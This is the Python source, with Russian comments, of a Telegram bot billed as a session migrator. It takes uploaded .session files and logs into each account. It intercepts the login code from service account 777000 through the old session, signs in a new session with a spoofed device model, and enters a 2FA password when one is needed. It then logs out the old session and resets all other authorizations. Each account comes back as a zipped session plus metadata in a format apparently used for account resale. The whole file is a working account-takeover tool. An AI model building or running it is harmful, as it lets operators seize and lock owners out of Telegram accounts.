#!/usr/bin/env python3
"""
Telegram Session Migrator Bot
Обработка сессий ПО ОЧЕРЕДИ (можно кидать несколько файлов)
"""

from __future__ import annotations

import asyncio
import json
import logging
import re
import shutil
import tempfile
import time
import uuid
import zipfile
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional, Set

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    BufferedInputFile,
    CallbackQuery,
    Document,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
)
from pydantic import Field, field_validator
from pydantic_settings import BaseSettings, SettingsConfigDict
from telethon import TelegramClient, events
from telethon.errors import (
    AuthKeyUnregisteredError,
    PasswordHashInvalidError,
    SessionPasswordNeededError,
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.types import User

# ====================== КОНФИГ ======================

class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

    api_id: int
    api_hash: str
    bot_token: str

    admin_ids: Set[int] = Field(default_factory=set)
    session_timeout_minutes: int = 15
    max_queue_per_user: int = 10          # максимум файлов в очереди у одного юзера

    device_model: str = "SLANFB5Z-EXTREME"
    system_version: str = "Windows 10"
    app_version: str = "7.0.9 x64"
    lang_code: str = "en"
    system_lang_code: str = "en"

    @field_validator("admin_ids", mode="before")
    @classmethod
    def parse_admin_ids(cls, v):
        if v is None:
            return set()
        if isinstance(v, int):
            return {v}
        if isinstance(v, str):
            return {int(x.strip()) for x in v.split(",") if x.strip()}
        if isinstance(v, (list, set, tuple)):
            return {int(x) for x in v}
        return set()


settings = Settings()

# ====================== ЛОГИРОВАНИЕ ======================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("SessionMigrator")

# ====================== FSM ======================

class MigrateStates(StatesGroup):
    waiting_password = State()


# ====================== МОДЕЛИ ======================

@dataclass
class QueueItem:
    id: str
    chat_id: int
    file_path: Path
    original_name: str
    status_message: Optional[Message] = None
    created_at: datetime = field(default_factory=datetime.now)


@dataclass
class ActiveMigration:
    id: str
    chat_id: int
    old_client: Optional[TelegramClient] = None
    new_client: Optional[TelegramClient] = None
    phone: str = ""
    phone_code_hash: str = ""
    temp_dir: Optional[Path] = None
    created_at: datetime = field(default_factory=datetime.now)
    code_event: Optional[asyncio.Event] = None
    received_code: Optional[str] = None
    status_message: Optional[Message] = None
    waiting_2fa: bool = False
    queue_item: Optional[QueueItem] = None


# Очередь: chat_id → список файлов
user_queues: Dict[int, List[QueueItem]] = {}

# Текущая активная миграция (только одна на пользователя)
current_migration: Dict[int, ActiveMigration] = {}

# Флаг, что воркер очереди уже запущен для пользователя
queue_workers: Dict[int, bool] = {}

stats = {"started": 0, "success": 0, "failed": 0, "cancelled": 0}


# ====================== УТИЛИТЫ ======================

def is_admin(user_id: int) -> bool:
    return user_id in settings.admin_ids


def cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отменить очередь", callback_data="cancel_queue")]
    ])


async def cleanup_migration(mig: ActiveMigration, state: Optional[FSMContext] = None):
    chat_id = mig.chat_id

    if chat_id in current_migration and current_migration[chat_id].id == mig.id:
        del current_migration[chat_id]

    for client in (mig.old_client, mig.new_client):
        if client:
            try:
                if client.is_connected():
                    await client.disconnect()
            except Exception:
                pass

    if mig.temp_dir and mig.temp_dir.exists():
        shutil.rmtree(mig.temp_dir, ignore_errors=True)

    if state and mig.waiting_2fa:
        await state.clear()


async def clear_user_queue(chat_id: int, state: Optional[FSMContext] = None):
    # Останавливаем текущую
    if chat_id in current_migration:
        await cleanup_migration(current_migration[chat_id], state)

    # Чистим очередь
    if chat_id in user_queues:
        for item in user_queues[chat_id]:
            try:
                if item.file_path.exists():
                    item.file_path.unlink(missing_ok=True)
            except Exception:
                pass
        del user_queues[chat_id]

    queue_workers[chat_id] = False
    if state:
        await state.clear()


# ====================== TELETHON ======================

async def create_metadata(client: TelegramClient, phone: str) -> dict[str, Any]:
    me: User = await client.get_me()
    ts = int(time.time())
    return {
        "app_id": settings.api_id,
        "app_hash": settings.api_hash,
        "device": settings.device_model,
        "sdk": settings.system_version,
        "app_version": settings.app_version,
        "system_lang_pack": settings.system_lang_code,
        "system_lang_code": settings.system_lang_code,
        "lang_pack": "tdesktop",
        "lang_code": settings.lang_code,
        "twoFA": None,
        "id": me.id,
        "phone": phone,
        "username": me.username,
        "is_premium": bool(getattr(me, "premium", False)),
        "has_profile_pic": bool(getattr(me, "photo", None)),
        "register_time": ts,
        "last_check_time": ts,
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "session_file": f"{phone}.session",
    }


async def finalize(mig: ActiveMigration, message: Message, state: Optional[FSMContext] = None):
    client = mig.new_client
    phone = mig.phone
    temp_dir = mig.temp_dir

    try:
        if not client or not await client.is_user_authorized():
            raise AuthKeyUnregisteredError("Новая сессия не авторизована")

        # 1. Выходим из старой
        if mig.old_client:
            try:
                if mig.old_client.is_connected():
                    await mig.old_client.log_out()
                    logger.info(f"[{mig.id}] Старая сессия вышла")
            except Exception as e:
                logger.warning(f"[{mig.id}] log_out: {e}")

        # 2. ResetAuthorizations
        try:
            await client(ResetAuthorizationsRequest())
            logger.info(f"[{mig.id}] ResetAuthorizations OK")
        except Exception as e:
            logger.warning(f"[{mig.id}] ResetAuthorizations: {e}")

        await asyncio.sleep(1.2)

        metadata = await create_metadata(client, phone)

        await client.disconnect()
        mig.new_client = None

        session_file = temp_dir / f"{phone}.session"
        original = Path(str(temp_dir / "new_session") + ".session")
        if original.exists():
            original.rename(session_file)

        if not session_file.exists():
            raise FileNotFoundError("Файл новой сессии не создан")

        meta_file = temp_dir / f"{phone}.json"
        meta_file.write_text(json.dumps(metadata, ensure_ascii=False, indent=2), encoding="utf-8")

        zip_path = temp_dir / f"{phone}_new_session.zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(session_file, arcname=f"{phone}.session")
            zf.write(meta_file, arcname=f"{phone}.json")

        data = zip_path.read_bytes()

        caption = (
            f"✅ <b>Новая сессия создана!</b>\n\n"
            f"📞 <code>{phone}</code>\n"
            f"🆔 <code>{metadata['id']}</code>\n"
            f"👤 {metadata['first_name']} {metadata['last_name']}\n"
            f"{'⭐ Premium' if metadata['is_premium'] else ''}\n\n"
            f"🔒 Старая сессия завершена."
        )

        await message.answer_document(
            BufferedInputFile(data, filename=f"{phone}_new_session.zip"),
            caption=caption,
        )

        stats["success"] += 1
        logger.info(f"[{mig.id}] Успех {phone}")

    except Exception as e:
        logger.exception(f"[{mig.id}] Ошибка финализации")
        stats["failed"] += 1
        await message.answer(f"❌ Ошибка: <code>{e}</code>")
    finally:
        await cleanup_migration(mig, state)


# ====================== ОБРАБОТКА ОДНОЙ СЕССИИ ======================

async def process_one_session(item: QueueItem, bot: Bot, state: FSMContext):
    chat_id = item.chat_id
    mig_id = str(uuid.uuid4())[:8]

    status = await bot.send_message(
        chat_id,
        f"⏳ Начинаю обработку <b>{item.original_name}</b>..."
    )

    mig = ActiveMigration(
        id=mig_id,
        chat_id=chat_id,
        status_message=status,
        queue_item=item,
    )
    current_migration[chat_id] = mig

    try:
        mig.temp_dir = Path(tempfile.mkdtemp(prefix=f"mig_{chat_id}_{mig_id}_"))
        old_session_path = mig.temp_dir / "old.session"
        new_session_path = str(mig.temp_dir / "new_session")

        # Копируем файл из очереди
        shutil.copy(item.file_path, old_session_path)

        # === Старый клиент ===
        old_client = TelegramClient(
            str(old_session_path.with_suffix("")),
            settings.api_id,
            settings.api_hash,
            device_model=settings.device_model,
            system_version=settings.system_version,
            app_version=settings.app_version,
            lang_code=settings.lang_code,
            system_lang_code=settings.system_lang_code,
        )
        await old_client.connect()

        if not await old_client.is_user_authorized():
            await status.edit_text(f"❌ <b>{item.original_name}</b> — сессия не авторизована.")
            await cleanup_migration(mig)
            return

        me = await old_client.get_me()
        phone = me.phone
        if not phone:
            await status.edit_text(f"❌ <b>{item.original_name}</b> — не удалось получить номер.")
            await cleanup_migration(mig)
            return

        phone = f"+{phone}" if not str(phone).startswith("+") else str(phone)
        mig.phone = phone
        mig.old_client = old_client

        await status.edit_text(
            f"✅ <b>{item.original_name}</b>\n"
            f"📞 <code>{phone}</code>\n\n"
            f"⏳ Запрашиваю код..."
        )

        # === Новый клиент ===
        new_client = TelegramClient(
            new_session_path,
            settings.api_id,
            settings.api_hash,
            device_model=settings.device_model,
            system_version=settings.system_version,
            app_version=settings.app_version,
            lang_code=settings.lang_code,
            system_lang_code=settings.system_lang_code,
        )
        await new_client.connect()
        mig.new_client = new_client

        result = await new_client.send_code_request(phone)
        mig.phone_code_hash = result.phone_code_hash

        mig.code_event = asyncio.Event()
        mig.received_code = None

        @old_client.on(events.NewMessage(from_users=777000))
        async def code_handler(event):
            if mig.code_event and not mig.code_event.is_set():
                match = re.search(r"\b(\d{5,6})\b", event.raw_text)
                if match:
                    mig.received_code = match.group(1)
                    logger.info(f"[{mig.id}] Код получен: {mig.received_code}")
                    mig.code_event.set()

        await status.edit_text(
            f"📩 <b>{item.original_name}</b>\n"
            f"Код запрошен. Жду сообщение от 777000..."
        )

        try:
            await asyncio.wait_for(mig.code_event.wait(), timeout=90)
        except asyncio.TimeoutError:
            await status.edit_text(f"❌ <b>{item.original_name}</b> — код не пришёл.")
            await cleanup_migration(mig)
            return

        code = mig.received_code
        if not code:
            await status.edit_text(f"❌ <b>{item.original_name}</b> — не удалось извлечь код.")
            await cleanup_migration(mig)
            return

        await status.edit_text(f"✅ Код получен: <code>{code}</code>\n⏳ Вхожу...")

        try:
            await new_client.sign_in(phone=phone, code=code, phone_code_hash=mig.phone_code_hash)
            await status.edit_text("✅ Вход выполнен! Формирую файлы...")
            await finalize(mig, status, state)

        except SessionPasswordNeededError:
            mig.waiting_2fa = True
            await state.set_state(MigrateStates.waiting_password)
            await status.edit_text(
                f"🔒 <b>{item.original_name}</b>\n"
                f"Нужен облачный пароль (2FA).\n\nОтправь пароль:",
                reply_markup=cancel_kb(),
            )
            # Ждём, пока пользователь введёт пароль (обработается в хендлере)
            return

        except Exception as e:
            logger.exception(f"[{mig.id}] Ошибка sign_in")
            await status.edit_text(f"❌ Ошибка входа: <code>{e}</code>")
            await cleanup_migration(mig)

    except Exception as e:
        logger.exception(f"[{mig.id}] Ошибка обработки")
        await status.edit_text(f"❌ Ошибка: <code>{e}</code>")
        await cleanup_migration(mig)


# ====================== ВОРКЕР ОЧЕРЕДИ ======================

async def queue_worker(chat_id: int, bot: Bot, state: FSMContext):
    """Обрабатывает очередь пользователя по одному файлу."""
    queue_workers[chat_id] = True

    while True:
        queue = user_queues.get(chat_id, [])
        if not queue:
            break

        # Берём первый файл
        item = queue.pop(0)
        if not queue:
            user_queues.pop(chat_id, None)

        remaining = len(user_queues.get(chat_id, []))
        if remaining > 0:
            await bot.send_message(
                chat_id,
                f"📋 В очереди ещё: <b>{remaining}</b> файл(ов)"
            )

        await process_one_session(item, bot, state)

        # Если ушли в ожидание 2FA — выходим из воркера,
        # продолжение будет после ввода пароля
        if chat_id in current_migration and current_migration[chat_id].waiting_2fa:
            queue_workers[chat_id] = False
            return

        # Небольшая пауза между сессиями
        await asyncio.sleep(1.5)

    queue_workers[chat_id] = False
    await bot.send_message(chat_id, "✅ Очередь полностью обработана.")


# ====================== ХЕНДЛЕРЫ ======================

router = Router()


@router.message(Command("start", "help"))
async def cmd_start(message: Message, state: FSMContext):
    chat_id = message.chat.id
    await clear_user_queue(chat_id, state)

    await message.answer(
        "🔄 <b>Мигратор сессий (очередь)</b>\n\n"
        "Отправляй мне <b>.session</b> файлы — можно сразу несколько.\n"
        "Я буду обрабатывать их <b>по очереди</b>.\n\n"
        "После каждой успешной миграции старая сессия завершается.",
        reply_markup=cancel_kb(),
    )


@router.message(Command("cancel"))
@router.callback_query(F.data == "cancel_queue")
async def cmd_cancel(event: Message | CallbackQuery, state: FSMContext):
    chat_id = event.from_user.id if isinstance(event, CallbackQuery) else event.chat.id
    await clear_user_queue(chat_id, state)
    stats["cancelled"] += 1

    text = "✅ Очередь и текущая обработка отменены."
    if isinstance(event, CallbackQuery):
        await event.message.edit_text(text)
        await event.answer()
    else:
        await event.answer(text)


@router.message(F.document)
async def process_session_file(message: Message, state: FSMContext):
    chat_id = message.chat.id
    doc: Document = message.document

    if not doc.file_name or not doc.file_name.lower().endswith(".session"):
        await message.answer("❌ Нужен файл с расширением <code>.session</code>")
        return

    # Проверяем лимит очереди
    current_queue_len = len(user_queues.get(chat_id, []))
    if current_queue_len >= settings.max_queue_per_user:
        await message.answer(f"❌ Очередь полная (максимум {settings.max_queue_per_user}).")
        return

    # Скачиваем файл во временную папку
    temp_dir = Path(tempfile.mkdtemp(prefix=f"queue_{chat_id}_"))
    file_path = temp_dir / doc.file_name
    await message.bot.download(doc, destination=file_path)

    item = QueueItem(
        id=str(uuid.uuid4())[:8],
        chat_id=chat_id,
        file_path=file_path,
        original_name=doc.file_name,
    )

    if chat_id not in user_queues:
        user_queues[chat_id] = []
    user_queues[chat_id].append(item)

    pos = len(user_queues[chat_id])
    await message.answer(
        f"📥 <b>{doc.file_name}</b> добавлен в очередь.\n"
        f"Позиция: <b>{pos}</b>",
        reply_markup=cancel_kb(),
    )

    stats["started"] += 1

    # Запускаем воркер, если он ещё не работает
    if not queue_workers.get(chat_id, False):
        asyncio.create_task(queue_worker(chat_id, message.bot, state))


@router.message(MigrateStates.waiting_password)
async def process_2fa(message: Message, state: FSMContext):
    chat_id = message.chat.id
    password = (message.text or "").strip()

    mig = current_migration.get(chat_id)
    if not mig or not mig.new_client or not mig.waiting_2fa:
        await message.answer("Сейчас нет ожидания пароля. /start")
        return

    if not password:
        await message.answer("❌ Пароль пустой. Попробуй ещё раз:")
        return

    status = await message.answer("⏳ Проверяю пароль...")

    try:
        await mig.new_client.sign_in(password=password)
        mig.waiting_2fa = False
        await status.edit_text("✅ 2FA пройден! Формирую файлы...")
        await finalize(mig, status, state)

        # После 2FA продолжаем очередь
        if user_queues.get(chat_id):
            asyncio.create_task(queue_worker(chat_id, message.bot, state))

    except PasswordHashInvalidError:
        await status.edit_text("❌ Неверный пароль. Попробуй ещё раз:")
    except Exception as e:
        logger.exception("Ошибка 2FA")
        await status.edit_text(f"❌ Ошибка: <code>{e}</code>")
        await cleanup_migration(mig, state)


@router.message(Command("stats"))
async def cmd_stats(message: Message):
    if not is_admin(message.from_user.id):
        return

    total_queue = sum(len(q) for q in user_queues.values())
    total_active = len(current_migration)

    await message.answer(
        f"📊 <b>Статистика</b>\n\n"
        f"Запусков: {stats['started']}\n"
        f"Успешных: {stats['success']}\n"
        f"Ошибок: {stats['failed']}\n"
        f"Отменено: {stats['cancelled']}\n"
        f"Сейчас в очереди: {total_queue}\n"
        f"Сейчас обрабатывается: {total_active}"
    )


# ====================== ЗАПУСК ======================

async def main():
    bot = Bot(token=settings.bot_token, default=DefaultBotProperties(parse_mode="HTML"))
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    logger.info("Session Migrator Bot (очередь) запущен")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
